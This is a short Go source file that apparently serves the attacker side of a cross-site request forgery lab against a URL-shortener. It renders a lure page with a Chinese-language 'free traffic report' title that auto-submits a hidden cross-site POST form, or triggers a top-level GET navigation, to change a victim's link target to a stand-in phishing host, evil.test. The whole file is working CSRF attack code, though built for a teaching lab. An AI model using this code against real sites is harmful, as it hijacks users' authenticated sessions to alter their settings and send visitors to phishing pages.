package main

import (
	"html/template"
	"log"
	"net/http"
)

const evilTarget = "http://evil.test:9666/phish" // where the attacker wants /a1 to go

var attackTmpl = template.Must(template.New("attack").Parse(`<!doctype html>
<meta charset="utf-8"><title>免費領取短網址流量報告</title>
{{if eq .Kind "post"}}
<form method="POST" action="{{.Victim}}/settings/target">
  <input type="hidden" name="url" value="{{.Evil}}">
</form>
<script>document.forms[0].submit()</script>
{{else if eq .Kind "get"}}
<script>location.href = {{.GetURL}}</script>
{{else}}
<p><a href="/post">攻擊 A：跨站 POST 表單</a></p>
<p><a href="/get">攻擊 B：頂層 GET 導覽</a></p>
{{end}}
`))

// attackPage serves the evil.test side of the lab: a page that makes the
// victim's browser send alice's cookies to the victim, which she never intended.
func attackPage(victim string, logger *log.Logger) http.Handler {
	page := func(kind string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			err := attackTmpl.Execute(w, map[string]string{
				"Kind":   kind,
				"Victim": victim,
				"Evil":   evilTarget,
				"GetURL": victim + "/legacy/set-target?url=" + evilTarget,
			})
			if err != nil {
				logger.Printf("render attack page: %v", err)
			}
		}
	}
	mux := http.NewServeMux()
	mux.HandleFunc("GET /{$}", page("index"))
	mux.HandleFunc("GET /post", page("post"))
	mux.HandleFunc("GET /get", page("get"))
	return mux
}
